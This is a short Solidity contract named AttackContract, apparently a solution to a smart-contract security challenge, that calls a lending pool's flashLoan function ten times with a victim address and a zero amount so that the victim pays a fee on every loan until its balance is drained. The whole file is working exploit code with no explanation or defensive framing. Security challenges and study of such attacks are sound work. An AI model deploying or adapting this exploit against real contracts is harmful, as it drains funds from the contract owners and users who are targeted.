pragma solidity ^0.6.0;

contract AttackContract {
	address payable pool;
	address payable target;
  constructor(address payable poolAddress,address payable targetAddress) public {
        pool = poolAddress;
        target = targetAddress;
    }

  function  attackTarget() public{
  	bytes memory payload = abi.encodeWithSignature(
  		"flashLoan(address,uint256)",
  		target,
        0
     	);
  	for(uint i=1;i<=10;i++){
  		(bool success, ) = pool.call(payload);
  		require (success, "Attack Teribbly Failed");  		
  	}
  	
  }
  
}
